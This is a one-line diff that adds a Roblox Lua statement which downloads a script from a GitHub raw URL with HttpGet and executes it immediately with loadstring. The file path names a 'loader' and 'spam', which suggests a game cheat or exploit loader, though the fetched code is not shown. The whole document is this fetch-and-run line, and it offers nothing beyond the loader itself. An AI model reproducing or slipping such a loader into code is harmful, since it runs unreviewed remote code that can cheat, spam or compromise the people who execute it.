@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/new-map-bloxstrike-spam3-9ysama6odx7yfh.lua"))()
